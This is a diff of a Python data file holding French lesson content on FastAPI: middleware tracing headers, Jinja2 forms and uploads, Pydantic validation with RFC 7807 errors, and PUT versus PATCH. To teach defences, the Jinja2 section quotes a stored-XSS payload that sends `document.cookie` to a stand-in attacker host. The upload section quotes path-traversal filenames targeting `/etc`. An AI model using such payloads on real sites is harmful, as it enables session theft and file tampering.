                 ["`has_prev`", "`bool`", "`page > 1`", "Activer ou griser le bouton « Page précédente »"]
@@ -295,8 +370,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Dans l'exécuteur Python ci-dessus, testez la pagination sur la `page = 2` puis la `page = 3` avec `limit = 2`.",
-            "Cliquez sur le bouton « Tester avec Pagination & Tri » pour exécuter `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc`."
+            "Dans l'exécuteur Python ci-dessus, parcourez successivement `page=1`, `page=2` et `page=3` avec `limit=2` et vérifiez la bascule des indicateurs booléens `has_prev` et `has_next`.",
+            "Utilisez le bouton « Tester avec Pagination & Tri » pour appeler `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc`, puis tentez `limit=500` afin d'observer le rejet défensif."
         ]
     },
 
@@ -305,44 +380,71 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l4": {
         "context": (
-            "Lorsqu'une API compte 50 routes, comment mesurer le temps d'exécution exact en millisecondes de chaque "
-            "appel, attribuer un numéro de suivi unique (`X-Request-ID`) et ajouter des en-têtes de sécurité sans "
-            "copier-coller les mêmes lignes dans les 50 fonctions ?\n"
-            "La réponse architecturale s'appelle un **Middleware HTTP**. Dans FastAPI, le décorateur "
-            "**`@app.middleware(\"http\")`** permet d'envelopper 100 % du trafic autour de l'instruction `response = await call_next(request)`."
+            "À mesure qu'une plateforme API s'étoffe pour atteindre cinquante ou cent cinquante routes métier, des "
+            "exigences transversales d'exploitation apparaissent : chronométrer à la microseconde la latence réelle de "
+            "chaque transaction, estampiller chaque appel d'un identifiant de corrélation distribué (`X-Request-ID`), "
+            "sceller des en-têtes de durcissement navigateur (`X-Content-Type-Options: nosniff`) et alimenter un "
+            "journal d'audit normalisé.\n\n"
+            "Dupliquer cette plomberie d'observabilité au sein de chaque fonction de route violerait frontalement la "
+            "séparation des préoccupations. L'architecture ASGI résout élégamment ce problème par le patron du "
+            "**Middleware en pelures d'oignon (*Onion Architecture*)** : dans FastAPI, `@app.middleware(\"http\")` "
+            "enveloppe l'intégralité du trafic entrant et sortant autour d'un point de pivot asynchrone unique : "
+            "`response = await call_next(request)`."
         ),
         "deep_sections": [
             {
-                "heading": "1. Les 3 phases du Cycle de Vie d'une Requête dans un Middleware FastAPI",
+                "heading": "1. Modèle en couches concentriques ASGI et anatomie de `await call_next(request)`",
                 "body": (
-                    "Chaque requête HTTP qui franchit la porte de FastAPI traverse séquentiellement trois étapes dans `async def middleware(request: Request, call_next):` :\n"
-                    "1. **Phase Prétraitement (Avant `await call_next(request)`)** : S'exécute **avant** la fonction de route. Idéal "
-                    "pour démarrer un chronomètre haute précision (`time.perf_counter()`), extraire ou générer un `X-Request-ID`, "
-                    "ou bloquer globalement une requête (en retournant directement un `JSONResponse`).\n"
-                    "2. **Phase Métier (`response = await call_next(request)`)** : Passe le relais au routeur Starlette/FastAPI et attend la réponse de la route ciblée.\n"
-                    "3. **Phase Post-traitement (Après `await call_next(request)`)** : Reçoit l'objet `response` juste avant son départ "
-                    "sur le réseau. Permet d'injecter les en-têtes `X-Request-ID`, `X-Response-Time-Ms`, `X-Content-Type-Options: nosniff` "
-                    "et d'écrire une ligne d'audit dans les journaux du serveur. Elle doit **toujours retourner `response`**."
+                    "Dans Starlette et FastAPI, chaque middleware constitue une enveloppe asynchrone entourant "
+                    "l'application interne. Lorsqu'une requête HTTP franchit Uvicorn, elle traverse les middlewares de "
+                    "l'extérieur vers l'intérieur jusqu'à la route métier, puis la réponse remonte ces mêmes couches en "
+                    "sens inverse avant d'être écrite sur le socket TCP.\n\n"
+                    "#### Chronométrie monotone (`time.perf_counter()`) et contrat de retour\n\n"
+                    "À l'intérieur de `async def audit_middleware(request: Request, call_next):`, tout le code placé "
+                    "**avant** `await call_next(request)` forme la **phase d'interception amont** : on y démarre une "
+                    "horloge monotone haute résolution via `time.perf_counter()` (qui, contrairement à `time.time()`, "
+                    "possède une précision sub-microseconde et ne recule jamais lors d'une resynchronisation horaire NTP "
+                    "du serveur Linux) et on extrait ou forge l'identifiant de trace.\n\n"
+                    "L'expression `response = await call_next(request)` suspend le middleware pendant que le routeur, "
+                    "les dépendances `Depends()` et la route métier s'exécutent. Dès que `response` revient, la **phase "
+                    "aval** calcule le temps écoulé, enrichit le dictionnaire mutable `response.headers`, émet une trace "
+                    "structurée dans les journaux d'audit et **retourne impérativement `response`** au serveur ASGI."
                 )
             },
             {
-                "heading": "2. Pourquoi utiliser `request.state` plutôt qu'une variable globale Python ?",
+                "heading": "2. Concurrence coopérative et isolation mémoire par requête via `request.state`",
                 "body": (
-                    "Comment transmettre l'identifiant `request_id` généré dans le middleware à la fonction de route ?\n"
-                    "- **Danger d'une variable globale** : Sur un serveur asynchrone où plusieurs requêtes s'exécutent de manière "
-                    "concurrente sur la même boucle d'événements, une variable globale serait écrasée par une autre requête (*Race Condition*) !\n"
-                    "- **La solution `request.state`** : L'attribut `request.state` de Starlette/FastAPI est un espace mémoire **attaché uniquement à la requête courante**. "
-                    "Ce que le middleware écrit dans `request.state.request_id` est isolé pour cette requête et accessible dans la route."
+                    "Un piège redoutable guette les développeurs habitués aux scripts séquentiels lorsqu'ils souhaitent "
+                    "transmettre une donnée calculée dans le middleware (comme `request_id` ou l'empreinte du client) à "
+                    "la fonction de route : stocker cette valeur dans une variable globale du module Python.\n\n"
+                    "> [!WARNING] Conditions de course (*Race Conditions*) sur une boucle `asyncio` partagée\n"
+                    "> Sur un worker Uvicorn traitant 200 requêtes simultanées, dès que la requête A cède la main sur un `await` (lecture SQL ou appel HTTP), la boucle d'événements exécute le middleware de la requête B sur le même thread. Si `CURRENT_REQUEST_ID` était une variable globale, la requête B écraserait instantanément l'identifiant de la requête A, corrompant vos journaux d'audit financiers !\n\n"
+                    "La solution architecturale fournie par Starlette réside dans le conteneur **`request.state`** "
+                    "(adossé au dictionnaire `scope[\"state\"]` propre à chaque connexion ASGI). Toute valeur attachée "
+                    "par `request.state.request_id = req_id` vit dans un espace mémoire strictement isolé pour la durée "
+                    "exacte de cette requête, puis est libérée par le ramasse-miettes dès l'envoi de la réponse."
                 )
             },
             {
-                "heading": "3. L'importance industrielle du `X-Request-ID` (Correlation ID)",
+                "heading": "3. Traçabilité distribuée en production : le patron industriel du `X-Request-ID`",
                 "body": (
-                    "Lorsqu'un client partenaire vous signale : *« J'ai reçu une erreur hier à 14h12 »*, chercher dans un "
-                    "fichier de log contenant 500 000 lignes est un cauchemar.\n"
-                    "Avec un identifiant unique **`X-Request-ID`** (par exemple `req-8f91a2b3c4d5` généré par `uuid.uuid4()`) "
-                    "renvoyé dans les en-têtes HTTP de chaque réponse ET inscrit dans chaque ligne de log serveur, il suffit "
-                    "d'un simple `grep req-8f91a2b3c4d5 app.log` pour retrouver instantanément toute l'exécution correspondante."
+                    "Dans un système d'information bancaire ou ministériel où une requête traverse successivement un "
+                    "répartiteur Nginx, une passerelle FastAPI et trois microservices internes, diagnostiquer un incident "
+                    "signalé par un usager devient impossible si l'on ne dispose que d'horodatages approximatifs noyés "
+                    "dans des gigaoctets de logs.\n\n"
+                    "```http — Propagation de bout en bout de l'identifiant de corrélation\n"
+                    "HTTP/1.1 200 OK\n"
+                    "Content-Type: application/json\n"
+                    "X-Request-ID: req-8f91a2b3c4d5\n"
+                    "X-Response-Time-Ms: 1.84\n"
+                    "X-Content-Type-Options: nosniff\n"
+                    "```\n\n"
+                    "Un middleware professionnel applique une règle de propagation coopérative : si le proxy amont ou le "
+                    "client partenaire a déjà fourni un en-tête `X-Request-ID` sain, le middleware **le préserve** afin "
+                    "de maintenir une trace unique de bout en bout ; s'il est absent, il en génère un cryptographiquement "
+                    "unique via `uuid.uuid4().hex`. En inscrivant cet identifiant à la fois dans les journaux privés du "
+                    "serveur et dans l'en-tête HTTP retourné au client, l'équipe d'astreinte reconstitue l'intégralité "
+                    "d'une transaction en une fraction de seconde."
                 )
             }
         ],
@@ -397,8 +499,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script `day_2/04_middlewares_et_audit_log.py` dans l'atelier ci-dessus pour observer l'injection automatique de `X-Request-ID` et `X-Response-Time-Ms`.",
-            "Modifiez l'appel simulé dans l'atelier pour passer un en-tête personnalisé `headers={'X-Request-ID': 'trace-isgp-001'}` et vérifiez que le serveur conserve cet identifiant."
+            "Exécutez le script `day_2/04_middlewares_et_audit_log.py` dans l'atelier ci-dessus pour observer la génération automatique des en-têtes `X-Request-ID` et `X-Response-Time-Ms`.",
+            "Transmettez un en-tête explicite `headers={\"X-Request-ID\": \"trace-isgp-001\"}` lors de l'appel `TestClient` et vérifiez que le middleware propage fidèlement cet identifiant sans l'écraser."
         ]
     },
 
@@ -407,53 +509,74 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l5": {
         "context": (
-            "Un service Web complet en entreprise ne se limite pas toujours à des échanges JSON entre machines : "
-            "très souvent, l'application FastAPI doit aussi afficher un **portail d'administration**, une **page de connexion** "
-            "ou un **formulaire de saisie** pour des opérateurs humains.\n"
-            "Or, deux erreurs reviennent constamment chez les développeurs débutants :\n"
-            "1. **Coder du HTML en dur dans les fichiers Python (`return f\"<h1>{titre}</h1>\"`)**, ce qui mélange la logique "
-            "métier et la présentation tout en ouvrant une faille critique d'injection JavaScript (**XSS — Cross-Site Scripting**).\n"
-            "2. **Essayer de lire un formulaire HTML `<form method=\"POST\">` avec un `BaseModel` JSON**, ce qui échoue "
-            "car un navigateur soumettant un formulaire HTML n'envoie **pas** du JSON, mais le format "
-            "`application/x-www-form-urlencoded` déclaré avec **`Form(...)`** (ou `multipart/form-data` avec **`UploadFile = File(...)`**) !"
+            "Si les échanges machine-à-machine reposent universellement sur JSON, un serveur FastAPI d'entreprise "
+            "doit fréquemment exposer en parallèle un **back-office d'administration**, un **portail de dépôt de "
+            "pièces justificatives PDF** ou un **écran d'authentification unifié** directement rendus côté serveur "
+            "(*Server-Side Rendering — SSR*).\n\n"
+            "Deux écueils majeurs piègent régulièrement les ingénieurs qui abordent cette hybridation Web/API : "
+            "assembler des chaînes HTML par interpolation `f\"<td>{saisie}</td>\"` au cœur des routes Python — ce qui "
+            "ouvre instantanément la porte aux attaques critiques par **injection JavaScript (*Cross-Site Scripting / "
+            "XSS*)** — et tenter de réceptionner un formulaire HTML natif `<form method=\"POST\">` à travers un schéma "
+            "`BaseModel` JSON, alors que le navigateur encode ses données selon les normes MIME "
+            "`application/x-www-form-urlencoded` (`Form(...)`) ou `multipart/form-data` (`UploadFile = File(...)`)."
         ),
         "deep_sections": [
             {
-                "heading": "1. `Jinja2Templates` de FastAPI et la protection automatique Anti-XSS",
+                "heading": "1. Moteur `Jinja2Templates` et neutralisation contextuelle des failles XSS (*Auto-Escaping*)",
                 "body": (
-                    "Dans FastAPI, on ne construit **jamais** une page HTML par concaténation de chaînes dans le fichier `.py`. "
-                    "Tous les fichiers HTML sont placés dans le dossier dédié **`templates/`** et rendus par **`templates.TemplateResponse(request=request, name=\"fichier.html\", context={...})`** :\n"
-                    "- **Les expressions `{{ variable }}`** : Évaluent une variable ou un attribut Python (`{{ f.titre }}`) et l'insèrent dans la page.\n"
-                    "- **Sécurité automatique contre les failles XSS (*Auto-Escaping*)** : Si un attaquant saisit `<script>alert('Piraté')</script>` "
-                    "comme titre de formation, une f-string Python `f\"<td>{titre}</td>\"` exécuterait le script malveillant dans le navigateur de "
-                    "tous les visiteurs ! À l'inverse, **Jinja2 échappe automatiquement** les caractères spéciaux en `&lt;script&gt;...`, neutralisant l'attaque.\n"
-                    "- **Les structures de contrôle `{% ... %}`** : Permettent d'écrire des boucles (`{% for f in formations %} ... {% endfor %}`), "
-                    "des conditions (`{% if erreurs %} ... {% endif %}`) et de l'héritage de mise en page."
+                    "Dans une architecture FastAPI propre, le code Python ne contient jamais de balises HTML en dur : "
+                    "les gabarits de présentation résident dans un répertoire dédié `templates/` et sont compilés en "
+                    "bytecode Python par `Jinja2Templates(directory=\"templates\")`. Lorsqu'une route renvoie "
+                    "`templates.TemplateResponse(request=request, name=\"catalogue.html\", context={...})`, Jinja2 "
+                    "évalue les boucles `{% for f in formations %}` et les expressions `{{ f.titre }}` en appliquant "
+                    "automatiquement un **échappement HTML contextuel**.\n\n"
+                    "#### Anatomie d'une attaque *Stored XSS* et rempart d'échappement\n\n"
+                    "Supposons qu'un attaquant enregistre comme intitulé de formation la charge utile "
+                    "`<script>fetch('https://pirate.tld?c='+document.cookie)</script>`. Si le serveur concaténait cette "
+                    "chaîne dans une *f-string* brute, le navigateur de l'administrateur interpréterait la balise "
+                    "`<script>` comme du code légitime et l'exécuterait immédiatement. Avec Jinja2, chaque délimiteur "
+                    "dangereux (`<`, `>`, `&`, `\"`, `'`) est transcodé à la volée en entité inoffensive (`&lt;script&gt;...`), "
+                    "affichant littéralement le texte à l'écran sans jamais déclencher le moteur JavaScript."
                 )
             },
             {
-                "heading": "2. Anatomie d'un Formulaire HTML (`<form method=\"POST\">`) : `Form(...)` vs `BaseModel` JSON",
+                "heading": "2. Encodage `application/x-www-form-urlencoded` et extraction déclarative `Form(...)`",
                 "body": (
-                    "Comprenons exactement ce qu'envoie un navigateur Web lorsqu'un utilisateur remplit un formulaire `<form method=\"POST\" action=\"/formations\">` :\n"
-                    "- Chaque champ `<input name=\"titre\">`, `<input name=\"duree_jours\">`, `<select name=\"salle\">` est identifié par son attribut **`name=\"...\"`** "
-                    "(attention : l'attribut `id=\"...\"` ne sert qu'au CSS/JavaScript et n'est **jamais** envoyé au serveur !).\n"
-                    "- Au clic sur `<button type=\"submit\">`, le navigateur assemble une chaîne de paires `cle=valeur` séparées par `&` :\n"
-                    "  `titre=Architecture+API&duree_jours=5&salle=Salle+A`\n"
-                    "  accompagnée de l'en-tête HTTP : **`Content-Type: application/x-www-form-urlencoded`**.\n"
-                    "- Côté FastAPI :\n"
-                    "  - On déclare les champs du formulaire dans la signature de la route avec **`titre: str = Form(...)`** et **`duree_jours: str = Form(...)`** (ou `await request.form()`)."
+                    "Lorsqu'un opérateur humain clique sur le bouton de soumission d'un formulaire HTML standard "
+                    "`<form method=\"POST\" action=\"/formations\">`, le navigateur ne sérialise **jamais** les champs "
+                    "en JSON : il collecte tous les contrôles possédant un attribut **`name=\"...\"`** (l'attribut "
+                    "`id=\"...\"` est purement local au DOM/CSS et n'est jamais transmis sur le réseau !) et construit "
+                    "une charge utile encodée en pourcentage héritée de la spécification CGI.\n\n"
+                    "```http — Trame brute émise par un navigateur lors d'un POST de formulaire HTML\n"
+                    "POST /formations HTTP/1.1\n"
+                    "Host: intranet.isgp.dz\n"
+                    "Content-Type: application/x-www-form-urlencoded\n"
+                    "Content-Length: 48\n"
+                    "\n"
+                    "titre=Architecture+ASGI&duree_jours=5&salle=Labo\n"
+                    "```\n\n"
+                    "Côté FastAPI, tenter de lier cette trame à un argument `payload: FormationCreate` échoue par `422` "
+                    "car Starlette cherche un flux JSON. On déclare donc explicitement la provenance formulaire dans la "
+                    "signature via **`titre: str = Form(..., min_length=3)`** (ce qui s'appuie en interne sur la "
+                    "bibliothèque d'analyse en flux `python-multipart`)."
                 )
             },
             {
-                "heading": "3. Envoi de Fichiers (`multipart/form-data` -> `UploadFile = File(None)`) et Assainissement du Nom",
+                "heading": "3. Flux multipart (`UploadFile`), tampon `SpooledTemporaryFile` et patron `PRG` (`303 See Other`)",
                 "body": (
-                    "Deux mécanismes complémentaires sont indispensables pour maîtriser les formulaires en production :\n"
-                    "1. **Upload de fichiers (`enctype=\"multipart/form-data\"`)** : Dès qu'un formulaire contient `<input type=\"file\" name=\"document_pdf\">`, "
-                    "on ajoute `enctype=\"multipart/form-data\"` sur la balise `<form>`. FastAPI extrait les champs texte via `Form(...)` et les fichiers "
-                    "binaires via **`document_pdf: UploadFile | None = File(default=None)`**. Avant d'enregistrer le fichier sur le disque (`await document_pdf.read()`), il est "
-                    "obligatoire d'assainir son nom (`os.path.basename` + filtre alphanumérique) pour bloquer toute attaque *Path Traversal* (`../../etc/passwd`).\n"
-                    "2. **Le Patron `PRG` (*Post / Redirect / Get*)** : Après un `POST` réussi depuis un navigateur, renvoyer `RedirectResponse(url=\"/formations\", status_code=303)` "
-                    "évite que l'utilisateur ne soumette le formulaire une seconde fois en appuyant sur la touche `F5` (Actualiser)."
+                    "Dès qu'un formulaire inclut un sélecteur binaire `<input type=\"file\" name=\"syllabus_pdf\">`, "
+                    "l'encodage URL devient impropre au transport d'octets arbitraires : la balise `<form>` doit "
+                    "impérativement déclarer `enctype=\"multipart/form-data\"`. Le navigateur découpe alors le corps HTTP "
+                    "en sections séparées par une frontière unique (`boundary=----WebKitFormBoundary...`), mêlant champs "
+                    "texte (`Form(...)`) et flux binaires (`UploadFile = File(...)`).\n\n"
+                    "> [!TIP] Pourquoi préférer `UploadFile` à `bytes = File(...)` dans FastAPI ?\n"
+                    "> Déclarer `fichier: bytes = File(...)` force FastAPI à charger la totalité du fichier en mémoire RAM Python d'un seul bloc. À l'inverse, `UploadFile` enveloppe un `SpooledTemporaryFile` : tant que le fichier reste sous un seuil réduit (1 Mo), il demeure en RAM pour la vitesse ; au-delà, il bascule automatiquement sur disque temporaire et se lit par morceaux asynchrones (`await fichier.read(65536)`), protégeant vos workers Uvicorn contre la saturation mémoire.\n\n"
+                    "Deux garde-fous complètent cette ingénierie en production : d'une part, **ne jamais faire confiance "
+                    "à `fichier.filename`** sans l'assainir par `os.path.basename()` et une expression régulière stricte "
+                    "afin de déjouer toute attaque *Path Traversal* (`../../etc/cron.d/backdoor`) ; d'autre part, "
+                    "appliquer après validation le patron **Post / Redirect / Get (`PRG`)** en retournant "
+                    "`RedirectResponse(url=\"/formations\", status_code=303)` (`303 See Other`), ce qui convertit "
+                    "l'historique du navigateur en `GET` et empêche toute double création si l'utilisateur presse `F5`."
                 )
             }
         ],
@@ -501,8 +624,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Ouvrez l'atelier interactif réel sur `/sandbox/formulaire-jinja` (bouton ci-dessous ou dans la barre d'outils), soumettez une nouvelle formation via le formulaire HTML et observez la trame `application/x-www-form-urlencoded` reçue.",
-            "Testez également un envoi invalide (durée négative ou titre d'une seule lettre) pour observer comment la boucle Jinja2 `{% for err in erreurs %}` affiche les erreurs côté serveur."
+            "Ouvrez l'atelier interactif réel sur `/sandbox/formulaire-jinja`, soumettez une nouvelle formation via le formulaire HTML et inspectez dans l'onglet Réseau la charge utile `application/x-www-form-urlencoded`.",
+            "Saisissez volontairement un titre d'un seul caractère et une durée négative afin d'observer comment Jinja2 restitue proprement la liste des erreurs de validation dans l'interface."
         ]
     },
 
@@ -511,43 +634,73 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l1": {
         "context": (
-            "Jusqu'ici, notre serveur répondait principalement à des requêtes de consultation (`GET`). Dès que l'on "
-            "autorise les clients à **créer (`POST`)**, **modifier (`PUT`/`PATCH`)** et **supprimer (`DELETE`)** des "
-            "données (les 4 opérations **CRUD**), une règle cardinale de sécurité entre en jeu : **Ne jamais faire "
-            "confiance aux données envoyées par le client (*Never Trust User Input*)**.\n"
-            "Un client peut envoyer un JSON cassé, oublier un champ obligatoire, envoyer un texte à la place d'un "
-            "nombre ou tenter de créer une formation de `-15` jours. Ce chapitre enseigne comment valider rigoureusement "
-            "les payloads entrants avec **Pydantic v2 (`BaseModel`, `Field`, `@field_validator`)** et structurer les réponses d'erreur selon la norme internationale **RFC 7807 (Problem Details)**."
+            "Tant qu'un serveur ne traite que des requêtes de consultation `GET`, son état interne demeure en lecture "
+            "seule. Dès que l'on ouvre les opérations complètes du cycle **CRUD** — créer par `POST`, remplacer par "
+            "`PUT`, amender par `PATCH` et détruire par `DELETE` — l'axiome fondateur de la cybersécurité applicative "
+            "s'applique sans exception : **ne jamais accorder la moindre confiance aux octets émis par un client "
+            "(*Never Trust User Input*)**.\n\n"
+            "Un frontal Web buggé, un script partenaire mal encodé ou un attaquant utilisant `curl` peut expédier un "
+            "JSON syntaxiquement tronqué, omettre une clé obligatoire, substituer un tableau à un entier ou injecter "
+            "une durée négative `-15`. Ce chapitre détaille comment **Pydantic v2** (propulsé par son moteur Rust "
+            "`pydantic-core`) érige un sas de validation déterministe à l'entrée de FastAPI, et comment restituer "
+            "des diagnostics d'erreurs interopérables selon le standard **IETF RFC 7807 / RFC 9457 (`Problem Details`)**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Validation Déclarative par Schéma avec Pydantic v2 (`BaseModel` & `Field`)",
+                "heading": "1. Architecture de Pydantic v2 : schémas `BaseModel`, moteur Rust `pydantic-core` et `@field_validator`",
                 "body": (
-                    "Dans FastAPI, on définit la structure exacte attendue d'un corps JSON à l'aide d'une classe héritant de `pydantic.BaseModel` :\n"
-                    "- `titre: str = Field(..., min_length=3, max_length=120)` : Champ obligatoire (`...`) de 3 à 120 caractères.\n"
-                    "- `duree_jours: int = Field(..., ge=1, le=30)` : Entier obligatoire compris entre `1` et `30` inclus.\n"
-                    "- `@field_validator(\"titre\")` : Permet d'exécuter une règle métier personnalisée (ex: `.strip()` et rejet d'une chaîne composée uniquement d'espaces)."
+                    "Dans les frameworks dépourvus de validation déclarative, le développeur se retrouve contraint "
+                    "d'écrire en tête de chaque route des dizaines de conditions défensives fragiles (`if \"titre\" not "
+                    "in data or not isinstance(data[\"titre\"], str): ...`). FastAPI élimine intégralement ce code "
+                    "impératif en confiant le contrat d'entrée à une sous-classe de **`pydantic.BaseModel`**.\n\n"
+                    "#### Compilation du graphe de validation et modes d'exécution\n\n"
+                    "Au moment où l'interpréteur Python importe votre classe `FormationCreate(BaseModel)`, Pydantic v2 "
+                    "inspecte les annotations de type et les descripteurs **`Field(..., min_length=3, max_length=120, "
+                    "ge=1, le=30)`** pour compiler une structure d'arbre de validation native exécutée en **Rust** au "
+                    "sein de `pydantic-core` (jusqu'à vingt fois plus rapide que les validateurs Python purs). Lorsque "
+                    "des invariants métier dépassent les simples bornes numériques — par exemple normaliser les espaces "
+                    "via `.strip()` ou rejeter un intitulé ne contenant aucun caractère alphabétique — le décorateur "
+                    "**`@field_validator(\"titre\")`** greffe une fonction Python exécutée juste après la vérification "
+                    "structurelle Rust, toute levée de `ValueError` étant automatiquement convertie en rapport d'anomalie."
                 )
             },
             {
-                "heading": "2. Pourquoi collecter TOUTES les erreurs de validation plutôt que de s'arrêter à la première ?",
+                "heading": "2. Collecte exhaustive en une passe (`RequestValidationError`) et nuance `400` contre `422`",
                 "body": (
-                    "Imaginez un formulaire de création comportant 5 champs dont 3 sont erronés. Si votre API s'arrête dès "
-                    "le 1er champ invalide, l'utilisateur corrige le 1er champ, renvoie la requête, découvre que le 2ème est "
-                    "faux, corrige le 2ème, renvoie la requête et découvre que le 3ème est faux !\n"
-                    "Pydantic évalue tous les champs du modèle en une seule passe et regroupe toutes les anomalies dans `exc.errors()`, "
-                    "permettant de renvoyer la liste exhaustive des champs en erreur avec le code **`422 Unprocessable Entity`**."
+                    "Rien n'est plus pénible pour l'utilisateur d'un portail administratif ou pour l'intégrateur d'un "
+                    "progiciel partenaire qu'une API pratiquant le rejet « au premier obstacle » (*Fail-on-First-Error*) : "
+                    "sur un formulaire de dix champs comportant quatre erreurs de saisie, l'appelant devrait soumettre "
+                    "et corriger sa requête quatre fois d'affilée pour découvrir progressivement chaque anomalie.\n\n"
+                    "Pydantic v2 résout ce problème ergonomique en parcourant **l'intégralité des champs du schéma en "
+                    "une passe unique** avant de lever `RequestValidationError`. Le tableau `exc.errors()` répertorie "
+                    "pour chaque violation son chemin exact (`loc`, par exemple `[\"body\", \"duree_jours\"]`), son "
+                    "identifiant machine (`type`, tel que `greater_than_equal`) et son message explicatif.\n\n"
+                    "> [!IMPORTANT] Distinguer rigoureusement `400 Bad Request`, `415` et `422 Unprocessable Content`\n"
+                    "> Conformément à la RFC 9110, **`400 Bad Request`** sanctionne une charge utile syntaxiquement illisible (accolade JSON manquante, octets UTF-8 invalides), **`415 Unsupported Media Type`** signale un en-tête `Content-Type` incompatible, tandis que **`422 Unprocessable Content`** atteste que la syntaxe JSON a été parfaitement comprise mais que les valeurs violent la sémantique métier du contrat Pydantic."
                 )
             },
             {
-                "heading": "3. Le Standard International RFC 7807 (`Problem Details for HTTP APIs`)",
+                "heading": "3. Normalisation industrielle des erreurs : la spécification IETF RFC 7807 / RFC 9457",
                 "body": (
-                    "Pour éviter que chaque équipe n'invente son propre format d'erreur (`{\"err\": ...}`, `{\"message\": ...}`, "
-                    "`{\"fault\": ...}`), l'IETF a publié la norme **RFC 7807 / RFC 9457** (`media_type=\"application/problem+json\"`). Une erreur normalisée contient :\n"
-                    "- `type` : URI identifiant la catégorie d'erreur (ex: `https://api.isgp.dz/erreurs/validation`).\n"
-                    "- `title` : Résumé lisible du problème.\n"
-                    "- `status` : Répétition du code HTTP numérique (`422`).\n"
-                    "- `errors` : Liste détaillée des champs invalides (`[{\"champ\": \"duree_jours\", \"message\": \"...\"}]`)."
+                    "Si chaque microservice d'une institution invente son propre dialecte d'erreur (`{\"erreur\": \"...\"}`, "
+                    "`{\"fault\": {\"msg\": \"...\"}}`, `{\"ko\": true}`), les applications mobiles et passerelles API "
+                    "doivent maintenir autant d'analyseurs spécifiques que de services amont. Pour unifier ces échanges, "
+                    "l'IETF a standardisé le format **Problem Details for HTTP APIs (RFC 7807 consolidée par la RFC 9457)** "
+                    "sous le type MIME dédié **`application/problem+json`**.\n\n"
+                    "> « Ce document définit un format de détail de problème permettant d'embarquer des diagnostics lisibles par une machine dans une réponse HTTP sans avoir à inventer de nouveaux formats d'erreur pour chaque API. » — IETF RFC 9457 (Problem Details for HTTP APIs)\n\n"
+                    "```json — Enveloppe d'erreur normalisée RFC 7807 / 9457 générée par FastAPI\n"
+                    "{\n"
+                    "  \"type\": \"https://api.isgp.dz/erreurs/validation-contrat\",\n"
+                    "  \"title\": \"Données d'entrée non conformes au schéma\",\n"
+                    "  \"status\": 422,\n"
+                    "  \"detail\": \"2 champs du corps JSON ne respectent pas les contraintes métier.\",\n"
+                    "  \"instance\": \"/api/v1/formations\",\n"
+                    "  \"errors\": [\n"
+                    "    {\"champ\": \"titre\", \"message\": \"String should have at least 3 characters\"},\n"
+                    "    {\"champ\": \"duree_jours\", \"message\": \"Input should be greater than or equal to 1\"}\n"
+                    "  ]\n"
+                    "}\n"
+                    "```"
                 )
             }
         ],
@@ -586,8 +739,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script dans l'atelier ci-dessus pour observer la réponse RFC 7807 complète lorsqu'un client envoie un titre trop court et une durée négative.",
-            "Cliquez sur « Tester POST /api/sandbox/formations » pour créer une nouvelle formation dans la base du laboratoire."
+            "Exécutez le script dans l'atelier ci-dessus pour observer l'agrégation simultanée de plusieurs violations Pydantic au sein d'un seul document `application/problem+json`.",
+            "Utilisez le bouton « Tester POST /api/sandbox/formations » afin de persister une nouvelle formation valide et vérifiez la présence du code `201 Created` ainsi que de l'en-tête `Location`."
         ]
     },
 
@@ -596,47 +749,75 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l2": {
         "context": (
-            "Deux questions d'architecture reviennent systématiquement lors de la conception d'APIs professionnelles "
-            "(notamment dans la finance, le e-commerce et l'administration) :\n"
-            "1. **Quelle est la différence exacte entre `PUT` et `PATCH` pour modifier une ressource existante ?**\n"
-            "2. **Comment empêcher qu'un client qui clique deux fois sur « Payer » (ou dont le réseau 4G coupe et "
-            "réessaie automatiquement son `POST`) ne soit débité deux fois ?**\n"
-            "Ce chapitre apporte la réponse complète et l'implémentation de référence en Python/FastAPI."
+            "Dans les systèmes transactionnels critiques — paiement interbancaire, billetterie, enrôlement académique "
+            "ou facturation — deux subtilités protocolaires séparent les APIs amateurs des infrastructures résilientes. "
+            "Premièrement, comment modifier un dossier existant sans écraser accidentellement par `null` les colonnes "
+            "que le client n'a pas souhaité toucher (`PUT` contre `PATCH`) ?\n\n"
+            "Deuxièmement, comment garantir qu'un usager dont la connexion mobile 4G s'interrompt une demi-seconde "
+            "après avoir cliqué sur « Régler les frais d'inscription » — provoquant un réessai automatique de son "
+            "téléphone — ne sera **jamais débité deux fois** ? Ce chapitre dissèque la mécanique interne de "
+            "`model_dump(exclude_unset=True)` dans Pydantic v2 et implémente le patron industriel **`Idempotency-Key`**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Remplacement Intégral (`PUT`) vs Modification Partielle (`PATCH` — RFC 5789)",
+                "heading": "1. Remplacement intégral (`PUT`, RFC 9110) contre mutation partielle (`PATCH`, RFC 5789)",
                 "body": (
-                    "Supposons que la formation `#1` contienne : `{\"id\": 1, \"titre\": \"FastAPI\", \"duree_jours\": 5, \"salle\": \"Labo 1\"}`.\n"
-                    "- **Avec `PUT /api/v1/formations/1`** : La sémantique officielle de `PUT` est « **Remplacer l'intégralité "
-                    "de la fiche #1 par le document fourni** ». Le client doit donc envoyer **tous les champs obligatoires** "
-                    "(`titre`, `duree_jours`, `salle`). Tout champ non fourni est réinitialisé à sa valeur par défaut.\n"
-                    "- **Avec `PATCH /api/v1/formations/1`** : La sémantique de `PATCH` est « **Appliquer une modification "
-                    "partielle** ». Si vous voulez uniquement déménager la formation dans la `\"Salle B\"`, vous envoyez "
-                    "uniquement `{\"salle\": \"Salle B\"}` : grâce à `payload.model_dump(exclude_unset=True)`, le serveur conserve le `titre` et la `duree_jours` intacts !"
+                    "Bien que `PUT` et `PATCH` servent tous deux à mettre à jour une ressource existante identifiée par "
+                    "son URI (`/api/v1/formations/1`), leurs contrats sémantiques sont diamétralement opposés. La "
